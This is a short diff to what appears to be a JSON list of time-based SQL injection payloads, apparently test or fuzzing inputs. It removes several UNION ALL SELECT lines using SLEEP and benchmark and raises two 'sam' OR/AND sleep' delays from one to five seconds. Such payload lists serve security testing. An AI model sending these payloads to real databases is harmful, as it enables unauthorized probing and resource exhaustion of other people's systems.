@@ -1,10 +1,6 @@
 [
-	" UNION ALL SELECT benchmark(150000000, CHARSET('SomeCharValue')) --  ",
-	" UNION ALL SELECT benchmark(200000000, CHARSET('SomeCharValue')) --  ",
-	" UNION ALL SELECT SLEEP(5) --  ",
-	" UNION ALL SELECT SLEEP(10) --  ",
-	" sam' OR sleep(1)=0; --  ",
-	" sam' AND sleep(1)=0; --  ",
+	" sam' OR sleep(5)=0; --  ",
+	" sam' AND sleep(5)=0; --  ",
 	" sam' or benchmark(500000000,charset('abc')) = 0 ; --  ",
 	" 10 OR benchmark(500000000,charset('abc')) = 0 ; --  "
 ]
